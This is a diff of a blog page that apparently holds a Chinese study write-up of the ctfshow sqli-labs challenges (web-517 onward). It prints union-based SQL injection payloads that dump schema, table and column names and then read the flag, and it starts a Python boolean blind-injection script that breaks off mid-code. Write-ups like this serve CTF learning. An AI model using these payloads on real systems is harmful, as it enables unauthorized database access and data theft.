@@ -3,20 +3,31 @@
 <head>
   <meta charset="utf-8">
   <title>ctfshow-sqli-labs | MIXBP</title>
-  <meta name="keywords" content=" 学习笔记 , sql注入 ">
+  <meta name="keywords" content=" sql注入 , 学习笔记 ">
   <meta name="description" content="ctfshow-sqli-labs | MIXBP">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="ctfshow-php反序列化web-254先看题目： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ctfshow-sqli-labs">
-<meta property="og:url" content="https://mixbp.github.io/master/2025/03/08/ctfshow-sqli-labs/index.html">
+<meta property="og:title" content="ctfshow-php序列化">
+<meta property="og:url" content="https://mixbp.github.io/master/2025/03/14/ctfshow-php%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
 <meta property="og:site_name" content="MIXBP">
+<meta property="og:description" content="ctfshow-php反序列化web-254先看题目： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2025-03-08T09:51:18.000Z">
-<meta property="article:modified_time" content="2025-03-08T09:51:47.470Z">
+<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1.png">
+<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2.png">
+<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-3.png">
+<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-4.png">
+<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-5.png">
+<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-6.png">
+<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-7.png">
+<meta property="og:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-8.png">
+<meta property="article:published_time" content="2025-03-14T14:11:16.000Z">
+<meta property="article:modified_time" content="2025-03-16T09:12:50.376Z">
 <meta property="article:author" content="MIXBP">
 <meta property="article:tag" content="学习笔记">
-<meta property="article:tag" content="sql注入">
+<meta property="article:tag" content="php反序列化">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mixbp.github.io/image/ctfshow-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -115,7 +126,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(28)</small>
+                <small>(35)</small>
             
         </div>
     </li>
@@ -150,8 +161,8 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="28">
-<input type="hidden" id="yelog_site_word_count" value="68.7k">
+<input type="hidden" id="yelog_site_posts_number" value="35">
+<input type="hidden" id="yelog_site_word_count" value="86.9k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -197,11 +208,23 @@
     <div class="tag-wrapper">
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>报错注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>堆叠注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>命令执行</a>
             </li>
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>日志包含</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>刷题笔记</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -257,6 +280,10 @@
             </li>
         
             <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>PHP反序列化漏洞</a>
             </li>
         
@@ -270,6 +297,10 @@
         
             <li class="article-tag-list-item">
                 <i class="iconfont icon-tag"></i><a>sql注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>waf绕过</a>
             </li>
         
             <li class="article-tag-list-item">
@@ -293,8 +324,71 @@
         
         
         <a  class="All "
+           href="/2025/03/14/ctfshow-php%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="学习笔记,php反序列化"
+           data-author="" >
+            <span class="post-title" title="ctfshow-php序列化">ctfshow-php序列化</span>
+            <span class="post-date" title="2025-03-14 22:11:16">2025/03/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/14/GXYCTF2019-BabySQli1/"
+           data-tag="刷题笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="GXYCTF2019-BabySQli1">GXYCTF2019-BabySQli1</span>
+            <span class="post-date" title="2025-03-14 20:44:55">2025/03/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz1/"
+           data-tag="刷题笔记,文件包含,php反序列化"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2020青龙组-AreUSerialz1">网鼎杯2020青龙组-AreUSerialz1</span>
+            <span class="post-date" title="2025-03-13 23:36:35">2025/03/13</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/13/ZJCTF2019-NiZhuanSiWei1/"
+           data-tag="刷题笔记,文件包含"
+           data-author="" >
+            <span class="post-title" title="ZJCTF2019-NiZhuanSiWei1">ZJCTF2019-NiZhuanSiWei1</span>
+            <span class="post-date" title="2025-03-13 20:39:05">2025/03/13</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/12/RoarCTF2019-EasyCalc1/"
+           data-tag="刷题笔记,命令执行,waf绕过"
+           data-author="" >
+            <span class="post-title" title="RoarCTF2019-EasyCalc1">RoarCTF2019-EasyCalc1</span>
+            <span class="post-date" title="2025-03-12 19:36:00">2025/03/12</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL1/"
+           data-tag="刷题笔记,sql注入,报错注入"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019-HardSQL1">极客大挑战2019-HardSQL1</span>
+            <span class="post-date" title="2025-03-11 15:31:27">2025/03/11</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/"
+           data-tag="刷题笔记,sql注入,堆叠注入"
+           data-author="" >
+            <span class="post-title" title="强网杯2019-随便注1">强网杯2019-随便注1</span>
+            <span class="post-date" title="2025-03-11 00:07:32">2025/03/11</span>
+        </a>
+        
+        
+        <a  class="All "
            href="/2025/03/08/ctfshow-sqli-labs/"
-           data-tag="学习笔记,sql注入"
+           data-tag="sql注入,学习笔记"
            data-author="" >
             <span class="post-title" title="ctfshow-sqli-labs">ctfshow-sqli-labs</span>
             <span class="post-date" title="2025-03-08 17:51:18">2025/03/08</span>
@@ -303,7 +397,7 @@
         
         <a  class="All "
            href="/2025/03/04/ctfshow-sql%E6%B3%A8%E5%85%A5/"
-           data-tag="学习笔记,sql注入"
+           data-tag="sql注入,学习笔记"
            data-author="" >
             <span class="post-title" title="ctfshow-sql注入">ctfshow-sql注入</span>
             <span class="post-date" title="2025-03-04 23:42:23">2025/03/04</span>
@@ -393,7 +487,7 @@
         
         <a  class="All "
            href="/2025/01/29/ctfshow-web82/"
-           data-tag="做题笔记,文件包含"
+           data-tag="文件包含,做题笔记"
            data-author="" >
             <span class="post-title" title="ctfshow-web82">ctfshow-web82</span>
             <span class="post-date" title="2025-01-29 04:36:22">2025/01/29</span>
@@ -447,7 +541,7 @@
         
         <a  class="All "
            href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/"
-           data-tag="做题笔记,http协议"
+           data-tag="刷题笔记,http协议"
            data-author="" >
             <span class="post-title" title="极客大挑战2019Http">极客大挑战2019Http</span>
             <span class="post-date" title="2025-01-09 16:47:44">2025/01/09</span>
@@ -456,7 +550,7 @@
         
         <a  class="All "
            href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/"
-           data-tag="做题笔记,filter伪协议"
+           data-tag="刷题笔记,filter伪协议"
            data-author="" >
             <span class="post-title" title="极客大挑战2019SecretFile">极客大挑战2019SecretFile</span>
             <span class="post-date" title="2025-01-09 01:36:08">2025/01/09</span>
@@ -465,7 +559,7 @@
         
         <a  class="All "
            href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/"
-           data-tag="做题笔记,sql注入"
+           data-tag="刷题笔记,sql注入"
            data-author="" >
             <span class="post-title" title="极客大挑战2019LoveSQL">极客大挑战2019LoveSQL</span>
             <span class="post-date" title="2025-01-05 20:00:42">2025/01/05</span>
@@ -474,7 +568,7 @@
         
         <a  class="All "
            href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/"
-           data-tag="做题笔记,payload构造"
+           data-tag="刷题笔记,payload构造"
            data-author="" >
             <span class="post-title" title="极客大挑战2019Havefun">极客大挑战2019Havefun</span>
             <span class="post-date" title="2025-01-05 19:35:48">2025/01/05</span>
@@ -483,7 +577,7 @@
         
         <a  class="All "
            href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL/"
-           data-tag="做题笔记,sql注入"
+           data-tag="刷题笔记,sql注入"
            data-author="" >
             <span class="post-title" title="极客大挑战2019EasySQL">极客大挑战2019EasySQL</span>
             <span class="post-date" title="2025-01-05 19:10:32">2025/01/05</span>
@@ -492,7 +586,7 @@
         
         <a  class="All "
            href="/2025/01/03/sql%E6%B3%A8%E5%85%A5/"
-           data-tag="学习笔记,sql注入"
+           data-tag="sql注入,学习笔记"
            data-author="" >
             <span class="post-title" title="sql注入">sql注入</span>
             <span class="post-date" title="2025-01-03 21:14:16">2025/01/03</span>
@@ -573,21 +667,21 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">学习笔记</a>
-            
             <a class="color1">sql注入</a>
+            
+            <a class="color5">学习笔记</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2025-03-08 17:51:47'>2025-03-08 17:51</time>
+            Created At : <time class="date" title='Updated At: 2025-03-15 22:05:40'>2025-03-08 17:51</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:0</span>
+        <span>Count:5.7k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -617,7 +711,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-sqli-labs"><span class="toc-text">ctfshow-sqli-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-517-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">web-517 字符型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-518-%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-text">web-518 数字型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-519-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5id-1%E2%80%99"><span class="toc-text">web-519 字符型注入id&#x3D;1’)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-520-%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5id-1%E2%80%9D"><span class="toc-text">web-520 字符型注入id&#x3D;1”)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-521-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8id-1%E2%80%99"><span class="toc-text">web-521 布尔盲注id&#x3D;1’</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-522-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8id-1%E2%80%9D"><span class="toc-text">web-522 布尔盲注id&#x3D;1”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-523-%E5%88%A9%E7%94%A8SQL%E4%B8%AD%E7%9A%84into-outfile-%E5%87%BD%E6%95%B0-id-1%E2%80%99"><span class="toc-text">web-523 利用SQL中的into outfile 函数 id&#x3D;1’))</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-524-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">web-524 布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-525-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8id-1%E2%80%99"><span class="toc-text">web-525 时间盲注id&#x3D;1’</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-526-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8id-1%E2%80%9D"><span class="toc-text">web-526 时间盲注id&#x3D;1”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-527-POST%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5username-1%E2%80%99"><span class="toc-text">web-527 POST字符型注入username&#x3D;1’</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-528-POST%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5username-1%E2%80%9D"><span class="toc-text">web-528 POST字符型注入username&#x3D;1”)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-529-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5username-1%E2%80%99"><span class="toc-text">web-529 报错注入username&#x3D;1’)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-530-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5usrename-1%E2%80%9D%E3%80%81%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">web-530 报错注入usrename&#x3D;1”、布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-531-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5username-admin%E2%80%99"><span class="toc-text">web-531 报错注入username&#x3D;admin’</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-532-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5username-admin%E2%80%9D"><span class="toc-text">web-532 报错注入username&#x3D;admin”)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-533-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5password-1%E2%80%99"><span class="toc-text">web-533 报错注入password&#x3D;1’</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-534-ua%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-text">web-534 ua头注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-535-referer%E6%B3%A8%E5%85%A5"><span class="toc-text">web-535 referer注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-536-cookie%E6%B3%A8%E5%85%A5%E3%80%81uname-admin%E2%80%99"><span class="toc-text">web-536 cookie注入、uname&#x3D;admin’</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-537-Cookie%E6%B3%A8%E5%85%A5%E3%80%81base64%E5%8A%A0%E5%AF%86%E3%80%81uname-%E2%80%99"><span class="toc-text">web-537 Cookie注入、base64加密、uname&#x3D;’)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-538-uname-%E2%80%9D"><span class="toc-text">web-538 uname&#x3D;”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-539-00%E6%B3%A8%E9%87%8A%E7%AC%A6%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87"><span class="toc-text">web-539 ;%00注释符过滤绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-540-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5"><span class="toc-text">web-540 二次注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-541-or%E3%80%81and%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87%E3%80%81id-1%E2%80%99"><span class="toc-text">web-541 or、and双写绕过、id&#x3D;1’</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-542-%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-id-1%E3%80%81innodb"><span class="toc-text">web-542 无列名注入 id&#x3D;1、innodb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-543-%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E3%80%81or%E6%9B%BF%E6%8D%A2%E3%80%81-00sql%E7%BB%93%E6%9D%9F%E7%AC%A6"><span class="toc-text">web-543 空格过滤绕过、or替换、;%00sql结束符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-544-%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E3%80%81%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">web-544 绕过过滤、布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-545-%E5%A4%A7%E5%B0%8F%E5%86%99%E6%B7%B7%E5%90%88%E7%BB%95%E8%BF%87%E3%80%81-0a%E7%BB%95%E8%BF%87%E3%80%81-00sql%E7%BB%93%E6%9D%9F%E7%AC%A6%E3%80%81id-100%E2%80%99"><span class="toc-text">web-545 大小写混合绕过、%0a绕过、;%00sql结束符、id&#x3D;100’</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-546-id-100%E2%80%9D%E3%80%81%E5%85%B6%E4%BB%96%E5%90%8C%E4%B8%8A"><span class="toc-text">web-546 id&#x3D;100”、其他同上</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-547-%E5%A4%A7%E5%B0%8F%E5%86%99%E6%B7%B7%E5%90%88%E7%BB%95%E8%BF%87%E3%80%81%E5%A4%8D%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-text">web-547 大小写混合绕过、复写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-548-%E5%90%8C%E4%B8%8A"><span class="toc-text">web-548 同上</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-549-%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E9%87%8D%E5%A4%8D%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="toc-text">web-549 代码逻辑漏洞导致的重复参数注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-550-id-0%E2%80%9D-%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E9%87%8D%E5%A4%8D%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="toc-text">web-550 id&#x3D;0” 代码逻辑漏洞导致的重复参数注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-551-id-0%E2%80%9D-%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4%E7%9A%84%E9%87%8D%E5%A4%8D%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5"><span class="toc-text">web-551 id&#x3D;0”) 代码逻辑漏洞导致的重复参数注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-552-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E3%80%81%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-text">web-552 宽字节注入、无列名注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-553-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">web-553 宽字节注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-554-POST%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-text">web-554 POST宽字节注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-555-%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-id-0"><span class="toc-text">web-555 无列名注入 id&#x3D;0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-556-%E5%90%8C%E4%B8%8A"><span class="toc-text">web-556 同上</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-557-POST%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E3%80%81union%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5"><span class="toc-text">web-557 POST宽字节注入、union无列名注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-558-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">web-558 堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-559-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E3%80%81id-1"><span class="toc-text">web-559 堆叠注入 、id&#x3D;1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-560-%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E3%80%81id-1%E2%80%99"><span class="toc-text">web-560 堆叠注入、id&#x3D;1’)</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -633,7 +727,280 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <h1 id="ctfshow-sqli-labs"><a href="#ctfshow-sqli-labs" class="headerlink" title="ctfshow-sqli-labs"></a>ctfshow-sqli-labs</h1><h2 id="web-517-字符型注入"><a href="#web-517-字符型注入" class="headerlink" title="web-517 字符型注入"></a>web-517 字符型注入</h2><p>判断闭合类型</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span> and <span class="hljs-number">1</span>=<span class="hljs-number">2</span>--+	//成功回显、说明是字符型注入<br><span class="hljs-attribute">id</span>=<span class="hljs-number">1</span>&#x27; and <span class="hljs-number">1</span>=<span class="hljs-number">2</span>--+	//无回显，说明闭合成功，是单引号闭合<br></code></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">判断列数，测出有3列<br><span class="hljs-attribute">id</span>=1&#x27; order by 3--+<br><br>测试回显位，测得回显位是2,3<br><span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,3--+<br><br>查看库名，得到库名<span class="hljs-string">&#x27;ctfshow&#x27;</span><br><span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(schema_name) <span class="hljs-keyword">from</span> information_schema.schemata--+<br><br>查看表名，得到表名<span class="hljs-string">&#x27;flag&#x27;</span><br><span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;ctfshow&#x27;</span>--+<br><br>查看列名，得到列名<span class="hljs-string">&#x27;id,flag&#x27;</span><br><span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;flag&#x27;</span>--+<br><br>查看数据，得到flag<br><span class="hljs-attribute">id</span>=-1&#x27; union select 1,2,group_concat(id,<span class="hljs-string">&#x27;-&#x27;</span>,flag) <span class="hljs-keyword">from</span> ctfshow.flag--+<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="web-518-数字型注入"><a href="#web-518-数字型注入" class="headerlink" title="web-518 数字型注入"></a>web-518 数字型注入</h2><p>判断闭合类型</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span><span class="hljs-comment">--+	//无回显</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--+	//有回显</span><br>判断是数字型注入<br></code></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<p>将上题payload中的单引号闭合去掉即可</p>
+<hr>
+<h2 id="web-519-字符型注入id-1’"><a href="#web-519-字符型注入id-1’" class="headerlink" title="web-519 字符型注入id&#x3D;1’)"></a>web-519 字符型注入id&#x3D;1’)</h2><p>‘)闭合</p>
+<hr>
+<h2 id="web-520-字符型注入id-1”"><a href="#web-520-字符型注入id-1”" class="headerlink" title="web-520 字符型注入id&#x3D;1”)"></a>web-520 字符型注入id&#x3D;1”)</h2><p>“)闭合</p>
+<hr>
+<h2 id="web-521-布尔盲注id-1’"><a href="#web-521-布尔盲注id-1’" class="headerlink" title="web-521 布尔盲注id&#x3D;1’"></a>web-521 布尔盲注id&#x3D;1’</h2><p>判断闭合类型</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">--+	//有回显</span><br><span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span><span class="hljs-comment">--+	//无回想</span><br>说明是单引号闭合，且只会回显you are <span class="hljs-keyword">in</span>..。<br>所以可以使用布尔盲注<br></code></pre></td></tr></table></figure>
+
+<p>盲注脚本：</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs maxima">import requests<br><br><span class="hljs-keyword">if</span> __name__ == &#x27;__main__&#x27;:<br>    url = &#x27;http://6398c35d-<span class="hljs-number">03b5</span>-43f2-8f62-4a82ae9777d9.challenge.ctf.<span class="hljs-built_in">show</span>/?id=&#x27;<br>    result = &#x27;&#x27;<br>    i = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> True:<br>        i = i + <span class="hljs-number">1</span><br>        low = <span class="hljs-number">32</span><br>        high = <span class="hljs-number">127</span><br>        <span class="hljs-keyword">while</span> low &lt; high:<br>            mid = (low + high) // <span class="hljs-number">2</span><br><br>            # payload = f&#x27;<span class="hljs-number">1</span>\&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ascii</span>(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)--+&#x27;<br>            # payload = f&#x27;<span class="hljs-number">1</span>\&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">ascii</span>(substr((select group_concat(table_name) from information_schema.tables where table_schema=<span class="hljs-string">&quot;ctfshow&quot;</span>),&#123;i&#125;,<span class="hljs-number">1</span>))&gt;&#123;mid&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)--+&#x27;<br>            # payload = f&#x27;<span class="hljs-number">1</span>\&#x27; <span class="hljs-keyword">and</span> <span 